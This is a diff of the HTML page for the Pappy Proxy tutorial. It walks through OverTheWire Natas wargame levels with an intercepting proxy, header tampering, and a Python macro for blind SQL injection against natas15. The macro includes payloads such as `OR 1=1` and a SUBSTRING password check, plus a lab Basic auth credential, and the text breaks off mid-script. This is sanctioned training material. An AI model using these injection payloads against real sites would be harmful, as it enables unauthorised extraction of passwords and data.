@@ -6,7 +6,7 @@
   <head>
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     
-    <title>The Pappy Proxy Tutorial &mdash; Pappy Proxy 0.2.1 documentation</title>
+    <title>The Pappy Proxy Tutorial &mdash; Pappy Proxy 0.2.11 documentation</title>
     
     <link rel="stylesheet" href="_static/classic.css" type="text/css" />
     <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
@@ -14,7 +14,7 @@
     <script type="text/javascript">
       var DOCUMENTATION_OPTIONS = {
         URL_ROOT:    './',
-        VERSION:     '0.2.1',
+        VERSION:     '0.2.11',
         COLLAPSE_INDEX: false,
         FILE_SUFFIX: '.html',
         HAS_SOURCE:  true
@@ -23,7 +23,7 @@
     <script type="text/javascript" src="_static/jquery.js"></script>
     <script type="text/javascript" src="_static/underscore.js"></script>
     <script type="text/javascript" src="_static/doctools.js"></script>
-    <link rel="top" title="Pappy Proxy 0.2.1 documentation" href="index.html" />
+    <link rel="top" title="Pappy Proxy 0.2.11 documentation" href="index.html" />
     <link rel="next" title="Writing Plugins for the Pappy Proxy" href="pappyplugins.html" />
     <link rel="prev" title="The Pappy Proxy" href="overview.html" /> 
   </head>
@@ -43,7 +43,7 @@
         <li class="right" >
           <a href="overview.html" title="The Pappy Proxy"
              accesskey="P">previous</a> |</li>
-        <li class="nav-item nav-item-0"><a href="index.html">Pappy Proxy 0.2.1 documentation</a> &raquo;</li> 
+        <li class="nav-item nav-item-0"><a href="index.html">Pappy Proxy 0.2.11 documentation</a> &raquo;</li> 
       </ul>
     </div>  
 
@@ -104,11 +104,11 @@
 <h3><a class="toc-backref" href="#id3">Getting Started</a><a class="headerlink" href="#getting-started" title="Permalink to this headline">¶</a></h3>
 <p>The first thing you&#8217;ll need to do is get Pappy installed.</p>
 <p>Install from pypi:</p>
-<div class="highlight-python"><div class="highlight"><pre>$ pip install pappy
+<div class="highlight-python"><div class="highlight"><pre><span></span>$ pip install pappy
 </pre></div>
 </div>
 <p>or install from source:</p>
-<div class="highlight-python"><div class="highlight"><pre>$ git clone --recursive https://github.com/roglew/pappy-proxy.git
+<div class="highlight-python"><div class="highlight"><pre><span></span>$ git clone --recursive https://github.com/roglew/pappy-proxy.git
 $ cd pappy-proxy
 $ pip install .
 </pre></div>
@@ -118,7 +118,7 @@ $ pip install .
 <p class="last">Pappy only supports OS X and Linux! Nothing will work on Windows, sorry!</p>
 </div>
 <p>That was easy! Make a project directory anywhere for Natas and fire up Pappy.:</p>
-<div class="highlight-python"><div class="highlight"><pre>$ mkdir natas
+<div class="highlight-python"><div class="highlight"><pre><span></span>$ mkdir natas
 $ cd natas
 Copying default config to ./config.json
 Proxy is listening on port 8000
@@ -136,7 +136,7 @@ pappy&gt;
 <h3><a class="toc-backref" href="#id4">Installing Pappy&#8217;s CA Cert</a><a class="headerlink" href="#installing-pappy-s-ca-cert" title="Permalink to this headline">¶</a></h3>
 <p>In order to intercept HTTPS requests, you&#8217;ll need to add a CA cert to your browser. Installing the cert allows Pappy to act like a certificate authority and sign certificates for whatever it wants without your browser complaining.</p>
 <p>To generate certificates, you&#8217;ll use the <code class="docutils literal"><span class="pre">gencerts</span></code> command. This will generate certificates in Pappy&#8217;s directory. By default, all projects will use the certs in this directory, so you should only have to generate/install the certificates once.:</p>
-<div class="highlight-python"><div class="highlight"><pre>pappy&gt; gencerts
+<div class="highlight-python"><div class="highlight"><pre><span></span>pappy&gt; gencerts
 This will overwrite any existing certs in /home/anonymouse/pappy/pappyproxy/certs. Are you sure?
 (y/N) y
 Generating certs to /home/anonymouse/pappy/pappyproxy/certs
@@ -194,7 +194,7 @@ pappy&gt;
 <div class="section" id="testing-it-out">
 <h3><a class="toc-backref" href="#id10">Testing it Out</a><a class="headerlink" href="#testing-it-out" title="Permalink to this headline">¶</a></h3>
 <p>Start up Pappy in Lite mode by running <code class="docutils literal"><span class="pre">pappy</span> <span class="pre">-l</span></code>, enable the proxy in your browser, then navigate to a website:</p>
-<div class="highlight-python"><div class="highlight"><pre>/pappynatas/ $ pappy -l
+<div class="highlight-python"><div class="highlight"><pre><span></span>/pappynatas/ $ pappy -l
 Temporary datafile is /tmp/tmp5AQBrH
 Proxy is listening on port 8000
 pappy&gt; ls
@@ -219,7 +219,7 @@ Deleting temporary datafile
 <div class="section" id="setting-the-scope">
 <h3><a class="toc-backref" href="#id12">Setting the Scope</a><a class="headerlink" href="#setting-the-scope" title="Permalink to this headline">¶</a></h3>
 <p>The first thing we&#8217;ll do is set up Pappy so that it only intercepts requests going to <code class="docutils literal"><span class="pre">*.natas.labs.overthewire.org</span></code>:</p>
-<div class="highlight-python"><div class="highlight"><pre>pappy&gt; filter host containsr &quot;natas\.labs\.overthewire\.org$&quot;
+<div class="highlight-python"><div class="highlight"><pre><span></span>pappy&gt; filter host containsr &quot;natas\.labs\.overthewire\.org$&quot;
 pappy&gt; scope_save
 </pre></div>
 </div>
@@ -249,7 +249,7 @@ pappy&gt; scope_save
 <li><code class="docutils literal"><span class="pre">vfs</span> <span class="pre">&lt;reqid&gt;</span></code> prints the full response to a request you specify</li>
 </ul>
 <p>So to solve natas1, we&#8217;ll want to view the full response to our request to the page:</p>
-<div class="highlight-python"><div class="highlight"><pre>pappy&gt; ls
+<div class="highlight-python"><div class="highlight"><pre><span></span>pappy&gt; ls
 ID  Verb  Host                               Path                 S-Code            Req Len  Rsp Len  Time  Mngl
 16  GET   natas1.natas.labs.overthewire.org  /favicon.ico         404 Not Found     0        307      0.27  --
 15  GET   natas1.natas.labs.overthewire.org  /favicon.ico         404 Not Found     0        307      0.27  --
@@ -295,7 +295,7 @@ pappy&gt;
 <div class="section" id="natas-2">
 <h3><a class="toc-backref" href="#id15">Natas 2</a><a class="headerlink" href="#natas-2" title="Permalink to this headline">¶</a></h3>
 <p>When you visit this page, you get a message saying &#8220;There is nothing on this page&#8221;. That is probably a blatant lie. Let&#8217;s see what was in that response.:</p>
-<div class="highlight-python"><div class="highlight"><pre>pappy&gt; ls
+<div class="highlight-python"><div class="highlight"><pre><span></span>pappy&gt; ls
 ID  Verb  Host                               Path                 S-Code            Req Len  Rsp Len  Time  Mngl
 30  GET   natas2.natas.labs.overthewire.org  /favicon.ico         404 Not Found     0        307      0.27  --
 29  GET   natas2.natas.labs.overthewire.org  /favicon.ico         404 Not Found     0        307      0.27  --
@@ -338,11 +338,11 @@ pappy&gt;
 <li><code class="docutils literal"><span class="pre">fls</span></code> Show all currently applied filters</li>
 </ol>
 <p>The most complicated of these is the <code class="docutils literal"><span class="pre">filter</span></code> command since it takes a filter string as an argument. All a filter string is is a string that defines which requests will pass the filter. Anything that doesn&#8217;t pass the filter will be removed from the context. Most filter strings are of the format <code class="docutils literal"><span class="pre">&lt;field&gt;</span> <span class="pre">&lt;comparer&gt;</span> <span class="pre">&lt;value&gt;</span></code>. For example:</p>
-<div class="highlight-python"><div class="highlight"><pre><span class="n">host</span> <span class="ow">is</span> <span class="n">www</span><span class="o">.</span><span class="n">target</span><span class="o">.</span><span class="n">org</span>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">host</span> <span class="ow">is</span> <span class="n">www</span><span class="o">.</span><span class="n">target</span><span class="o">.</span><span class="n">org</span>
 
-<span class="n">field</span> <span class="o">=</span> <span class="s">&quot;host&quot;</span>
-<span class="n">comparer</span> <span class="o">=</span> <span class="s">&quot;is&quot;</span>
-<span class="n">value</span> <span class="o">=</span> <span class="s">&quot;www.target.org&quot;</span>
+<span class="n">field</span> <span class="o">=</span> <span class="s2">&quot;host&quot;</span>
+<span class="n">comparer</span> <span class="o">=</span> <span class="s2">&quot;is&quot;</span>
+<span class="n">value</span> <span class="o">=</span> <span class="s2">&quot;www.target.org&quot;</span>
 </pre></div>
 </div>
 <p>This filter will only match requests whose host is exactly <code class="docutils literal"><span class="pre">www.target.org</span></code>. When defining our scope, we applied a filter using a <code class="docutils literal"><span class="pre">containsr</span></code> comparer. This matches any request where the field matches a regular expression. Here are a few fields and comparers:</p>
@@ -367,7 +367,7 @@ pappy&gt;
 <h4><a class="toc-backref" href="#id19">Finding Passwords</a><a class="headerlink" href="#finding-passwords" title="Permalink to this headline">¶</a></h4>
 <p>While we can&#8217;t find all the passwords with one filter, if we remember how we got the password, we can find it pretty quickly</p>
 <p>For natas0 and natas1, the responses had a phrase like &#8220;the password is abc123&#8221;. So we can filter out anything that doesn&#8217;t have the word &#8220;password&#8221; in it.:</p>
-<div class="highlight-python"><div class="highlight"><pre>pappy&gt; ls
+<div class="highlight-python"><div class="highlight"><pre><span></span>pappy&gt; ls
 ID  Verb  Host                               Path               S-Code                 Req Len  Rsp Len  Time  Mngl
 52  GET   natas4.natas.labs.overthewire.org  /favicon.ico       404 Not Found          0        307      0.26  --
 51  GET   natas4.natas.labs.overthewire.org  /favicon.ico       404 Not Found          0        307      0.27  --
@@ -425,23 +425,23 @@ pappy&gt;
 <li><code class="docutils literal"><span class="pre">ic</span> <span class="pre">&lt;req|rsp&gt;+</span></code> Begin interception mode. Intercepts requests and/or responses as decided by the arguments given in the command. <code class="docutils literal"><span class="pre">ic</span> <span class="pre">req</span></code> will only intercept requests, <code class="docutils literal"><span class="pre">ic</span> <span class="pre">rsp</span></code> will only intercept responses, and <code class="docutils literal"><span class="pre">ic</span> <span class="pre">req</span> <span class="pre">rsp</span></code> will intercept both.</li>
 </ul>
 <p>In this case, we only want to intercept requests, so we&#8217;ll run <code class="docutils literal"><span class="pre">ic</span> <span class="pre">req</span></code>:</p>
-<div class="highlight-python"><div class="highlight"><pre>pappy&gt; ic req
+<div class="highlight-python"><div class="highlight"><pre><span></span>pappy&gt; ic req
 </pre></div>
 </div>
 <p>And we&#8217;ll get a screen that says something like:</p>
-<div class="highlight-python"><div class="highlight"><pre>Currently intercepting: Requests
+<div class="highlight-python"><div class="highlight"><pre><span></span>Currently intercepting: Requests
 0 item(s) in queue.
 Press &#39;n&#39; to edit the next item or &#39;q&#39; to quit interceptor.
 </pre></div>
 </div>
 <p>Now refresh the page in your browser. The page will hang like it&#8217;s taking a long time to load. Go back to Pappy, and now the interceptor will say something like:</p>
-<div class="highlight-python"><div class="highlight"><pre>Currently intercepting: Requests
+<div class="highlight-python"><div class="highlight"><pre><span></span>Currently intercepting: Requests
 1 item(s) in queue.
 Press &#39;n&#39; to edit the next item or &#39;q&#39; to quit interceptor.
 </pre></div>
 </div>
 <p>Press <code class="docutils literal"><span class="pre">n</span></code> and the request will be opened for editing! Which editor is used is defined by the <code class="docutils literal"><span class="pre">EDITOR</span></code> environment variable. Use the text editor to add a <code class="docutils literal"><span class="pre">Referer</span></code> header (note that there&#8217;s only one r):</p>
-<div class="highlight-python"><div class="highlight"><pre>GET / HTTP/1.1
+<div class="highlight-python"><div class="highlight"><pre><span></span>GET / HTTP/1.1
 Host: natas4.natas.labs.overthewire.org
 User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -489,7 +489,7 @@ Referer: http://natas5.natas.labs.overthewire.org/
 <p class="last">You must know the basics of how to use vim for the repeater and have a key bound to the leader. You can find more information on the leader key <a class="reference external" href="https://stackoverflow.com/questions/1764263/what-is-the-leader-in-a-vimrc-file">here</a>. By default &lt;leader&gt; is bound to <code class="docutils literal"><span class="pre">\</span></code>.</p>
 </div>
 <p>Submit a request then open that request in the repeater:</p>
-<div class="highlight-python"><div class="highlight"><pre>pappy&gt; ls
+<div class="highlight-python"><div class="highlight"><pre><span></span>pappy&gt; ls
 196  GET   natas9.natas.labs.overthewire.org  /index.php?needle=ball&amp;submit=Search      200 OK            0        1686     0.27  --
 195  GET   natas9.natas.labs.overthewire.org  /index-source.html                        200 OK            0        1952     0.27  --
 ... snip ...
@@ -511,7 +511,7 @@ pappy&gt; rp 196
 <li><code class="docutils literal"><span class="pre">rma</span> <span class="pre">&lt;name&gt;</span> <span class="pre">[args]</span></code> Run a macro, optionally with arguments</li>
 </ul>
 <p>So the first thing we&#8217;ll do is submit a request to have a base request that we can modify. Submit a request with any username. You should get a response back saying the user doesn&#8217;t exist. Now we&#8217;ll generate a macro and use that request as a base for our script:</p>
-<div class="highlight-python"><div class="highlight"><pre>pappy&gt; ls
+<div class="highlight-python"><div class="highlight"><pre><span></span>pappy&gt; ls
 ID   Verb  Host                                Path                                      S-Code            Req Len  Rsp Len  Time  Mngl
 224  POST  natas15.natas.labs.overthewire.org  /index.php                                200 OK            14       937      0.27  --
 223  POST  natas15.natas.labs.overthewire.org  /index.php                                200 OK            12       937      0.27  --
@@ -528,44 +528,44 @@ pappy&gt;
 </pre></div>
 </div>
 <p>Now open up <code class="docutils literal"><span class="pre">macro_brute.py</span></code> in your favorite text editor. You should have a script that looks like this:</p>
-<div class="highlight-python"><div class="highlight"><pre><span class="kn">from</span> <span class="nn">pappyproxy.http</span> <span class="kn">import</span> <span class="n">Request</span><span class="p">,</span> <span class="n">get_request</span><span class="p">,</span> <span class="n">post_request</span>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pappyproxy.http</span> <span class="kn">import</span> <span class="n">Request</span><span class="p">,</span> <span class="n">get_request</span><span class="p">,</span> <span class="n">post_request</span>
 <span class="kn">from</span> <span class="nn">pappyproxy.context</span> <span class="kn">import</span> <span class="n">set_tag</span>
 
-<span class="n">MACRO_NAME</span> <span class="o">=</span> <span class="s">&#39;Macro 41855887&#39;</span>
-<span class="n">SHORT_NAME</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+<span class="n">MACRO_NAME</span> <span class="o">=</span> <span class="s1">&#39;Macro 41855887&#39;</span>
+<span class="n">SHORT_NAME</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
 
-<span class="c">###########</span>
-<span class="c">## Requests</span>
-<span class="c"># It&#39;s suggested that you call .copy() on these and then edit attributes</span>
-<span class="c"># as needed to create modified requests</span>
-<span class="c">##</span>
+<span class="c1">###########</span>
+<span class="c1">## Requests</span>
+<span class="c1"># It&#39;s suggested that you call .copy() on these and then edit attributes</span>
+<span class="c1"># as needed to create modified requests</span>
+<span class="c1">##</span>
 
 
 <span class="n">req1</span> <span class="o">=</span> <span class="n">Request</span><span class="p">((</span>
-    <span class="s">&#39;POST /index.php HTTP/1.1</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Host: natas15.natas.labs.overthewire.org</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Accept-Language: en-US,en;q=0.5</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Referer: http://natas15.natas.labs.overthewire.org/</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Cookie: __cfduid=db41e9d9b4a13cc3ef4273055b71996fb1450464664</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Connection: keep-alive</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Content-Length: 14</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;username=admin&#39;</span>
+    <span class="s1">&#39;POST /index.php HTTP/1.1</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Host: natas15.natas.labs.overthewire.org</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Accept-Language: en-US,en;q=0.5</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Referer: http://natas15.natas.labs.overthewire.org/</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Cookie: __cfduid=db41e9d9b4a13cc3ef4273055b71996fb1450464664</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Connection: keep-alive</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Content-Length: 14</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;username=admin&#39;</span>
 <span class="p">))</span>
 
 
 <span class="k">def</span> <span class="nf">run_macro</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
-    <span class="c"># Example:</span>
-    <span class="c"># req = req0.copy() # Copy req0</span>
-    <span class="c"># req.submit() # Submit the request to get a response</span>
-    <span class="c"># print req.response.raw_headers # print the response headers</span>
-    <span class="c"># req.save() # save the request to the data file</span>
-    <span class="c"># or copy req0 into a loop and use string substitution to automate requests</span>
+    <span class="c1"># Example:</span>
+    <span class="c1"># req = req0.copy() # Copy req0</span>
+    <span class="c1"># req.submit() # Submit the request to get a response</span>
+    <span class="c1"># print req.response.raw_headers # print the response headers</span>
+    <span class="c1"># req.save() # save the request to the data file</span>
+    <span class="c1"># or copy req0 into a loop and use string substitution to automate requests</span>
     <span class="k">pass</span>
 </pre></div>
 </div>
@@ -577,19 +577,19 @@ pappy&gt;
 </ul>
 <p>It is suggested you go through the documentation to learn the rest of the attributes/functions.</p>
 <p>To start out simple, we&#8217;ll write a macro that lets us check a username from the Pappy console. To define a function, you define the <code class="docutils literal"><span class="pre">run_macro</span></code> function. The function is passed a list of arguments which represent the arguments entered. Here a <code class="docutils literal"><span class="pre">run_macro</span></code> function that we can define that will check if a user exists:</p>
-<div class="highlight-python"><div class="highlight"><pre><span class="k">def</span> <span class="nf">run_macro</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
-    <span class="n">to_check</span> <span class="o">=</span> <span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="c"># get the username to check</span>
-    <span class="n">r</span> <span class="o">=</span> <span class="n">req1</span><span class="o">.</span><span class="n">copy</span><span class="p">()</span> <span class="c"># make a copy of the base request</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">post_params</span><span class="p">[</span><span class="s">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">to_check</span> <span class="c"># set the username param of the request</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">submit</span><span class="p">()</span> <span class="c"># submit the request</span>
-    <span class="k">if</span> <span class="s">&quot;This user doesn&#39;t exist.&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">response</span><span class="o">.</span><span class="n">raw_data</span><span class="p">:</span> <span class="c"># check if the username is valid</span>
-        <span class="k">print</span> <span class="s">&quot;</span><span class="si">%s</span><span class="s"> is not a user&quot;</span> <span class="o">%</span> <span class="n">to_check</span>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">run_macro</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
+    <span class="n">to_check</span> <span class="o">=</span> <span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="c1"># get the username to check</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">req1</span><span class="o">.</span><span class="n">copy</span><span class="p">()</span> <span class="c1"># make a copy of the base request</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">post_params</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">to_check</span> <span class="c1"># set the username param of the request</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">submit</span><span class="p">()</span> <span class="c1"># submit the request</span>
+    <span class="k">if</span> <span class="s2">&quot;This user doesn&#39;t exist.&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">response</span><span class="o">.</span><span class="n">raw_data</span><span class="p">:</span> <span class="c1"># check if the username is valid</span>
+        <span class="k">print</span> <span class="s2">&quot;</span><span class="si">%s</span><span class="s2"> is not a user&quot;</span> <span class="o">%</span> <span class="n">to_check</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s">&quot;</span><span class="si">%s</span><span class="s"> is a user!&quot;</span> <span class="o">%</span> <span class="n">to_check</span>
+        <span class="k">print</span> <span class="s2">&quot;</span><span class="si">%s</span><span class="s2"> is a user!&quot;</span> <span class="o">%</span> <span class="n">to_check</span>
 </pre></div>
 </div>
 <p>Then to run it:</p>
-<div class="highlight-python"><div class="highlight"><pre>pappy&gt; lma
+<div class="highlight-python"><div class="highlight"><pre><span></span>pappy&gt; lma
 Loaded &quot;&lt;Macro Macro 41855887 (brute)&gt;&quot;
 pappy&gt; rma brute admin
 admin is not a user
@@ -602,15 +602,15 @@ pappy&gt;
 </div>
 <p>Awesome! Notice how we didn&#8217;t have to deal with authentication either. This is because the authentication is handled by the <code class="docutils literal"><span class="pre">Authorization</span></code> header which was included in the generated request.</p>
 <p>Time to add the SQL injection part. If we look at the source, we see that this is the SQL query that checks the username:</p>
-<div class="highlight-python"><div class="highlight"><pre>$query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot;&quot;;
+<div class="highlight-python"><div class="highlight"><pre><span></span>$query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot;&quot;;
 </pre></div>
 </div>
 <p>So to escape it, we use a payload like:</p>
-<div class="highlight-python"><div class="highlight"><pre>username&quot; OR 1=1; #
+<div class="highlight-python"><div class="highlight"><pre><span></span>username&quot; OR 1=1; #
 </pre></div>
 </div>
 <p>In this case, any username that ends in <code class="docutils literal"><span class="pre">&quot;</span> <span class="pre">OR</span> <span class="pre">1=1;</span> <span class="pre">#</span></code> will be considered a valid username. Let&#8217;s try this out:</p>
-<div class="highlight-python"><div class="highlight"><pre>pappy&gt; rma brute &quot;foo\&quot; OR 1=1;&quot;
+<div class="highlight-python"><div class="highlight"><pre><span></span>pappy&gt; rma brute &quot;foo\&quot; OR 1=1;&quot;
 foo&quot; OR 1=1; is a user!
 pappy&gt; rma brute &quot;fooooooo\&quot; OR 1=1;&quot;
 fooooooo&quot; OR 1=1; is a user!
@@ -618,62 +618,62 @@ pappy&gt;
 </pre></div>
 </div>
 <p>Great! Now we can check any true/false condition we want. In this case, we want to check if a certain character is at a certain position in the <code class="docutils literal"><span class="pre">password</span></code> column. We do this with the <code class="docutils literal"><span class="pre">ASCII</span></code> and <code class="docutils literal"><span class="pre">SUBSTRING</span></code> functions. So something like this will check if the first character is an <code class="docutils literal"><span class="pre">A</span></code>.:</p>
-<div class="highlight-python"><div class="highlight"><pre><span class="s">&#39;natas16&quot; AND ASCII(SUBSTRING(password, 0, 1)) = 41; #&#39;</span>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="s1">&#39;natas16&quot; AND ASCII(SUBSTRING(password, 0, 1)) = 41; #&#39;</span>
 </pre></div>
 </div>
 <p>Alright, let&#8217;s update our macro to find the first character of the password.:</p>
-<div class="highlight-python"><div class="highlight"><pre><span class="kn">from</span> <span class="nn">pappyproxy.http</span> <span class="kn">import</span> <span class="n">Request</span><span class="p">,</span> <span class="n">get_request</span><span class="p">,</span> <span class="n">post_request</span>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pappyproxy.http</span> <span class="kn">import</span> <span class="n">Request</span><span class="p">,</span> <span class="n">get_request</span><span class="p">,</span> <span class="n">post_request</span>
 <span class="kn">from</span> <span class="nn">pappyproxy.context</span> <span class="kn">import</span> <span class="n">set_tag</span>
 
-<span class="n">MACRO_NAME</span> <span class="o">=</span> <span class="s">&#39;Macro 41855887&#39;</span>
-<span class="n">SHORT_NAME</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+<span class="n">MACRO_NAME</span> <span class="o">=</span> <span class="s1">&#39;Macro 41855887&#39;</span>
+<span class="n">SHORT_NAME</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
 
-<span class="c">###########</span>
-<span class="c">## Requests</span>
-<span class="c"># It&#39;s suggested that you call .copy() on these and then edit attributes</span>
-<span class="c"># as needed to create modified requests</span>
-<span class="c">##</span>
+<span class="c1">###########</span>
+<span class="c1">## Requests</span>
+<span class="c1"># It&#39;s suggested that you call .copy() on these and then edit attributes</span>
+<span class="c1"># as needed to create modified requests</span>
+<span class="c1">##</span>
 
 
 <span class="n">req1</span> <span class="o">=</span> <span class="n">Request</span><span class="p">((</span>
-    <span class="s">&#39;POST /index.php HTTP/1.1</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Host: natas15.natas.labs.overthewire.org</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Accept-Language: en-US,en;q=0.5</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Referer: http://natas15.natas.labs.overthewire.org/</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Cookie: __cfduid=db41e9d9b4a13cc3ef4273055b71996fb1450464664</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Connection: keep-alive</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;Content-Length: 14</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;</span><span class="se">\r\n</span><span class="s">&#39;</span>
-    <span class="s">&#39;username=admin&#39;</span>
+    <span class="s1">&#39;POST /index.php HTTP/1.1</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Host: natas15.natas.labs.overthewire.org</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Accept-Language: en-US,en;q=0.5</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Referer: http://natas15.natas.labs.overthewire.org/</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Cookie: __cfduid=db41e9d9b4a13cc3ef4273055b71996fb1450464664</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Connection: keep-alive</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;Content-Length: 14</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+    <span class="s1">&#39;username=admin&#39;</span>
 <span class="p">))</span>
 
 <span class="k">def</span> <span class="nf">check_char</span><span class="p">(</span><span class="n">char</span><span class="p">,</span> <span class="n">pos</span><span class="p">):</span>
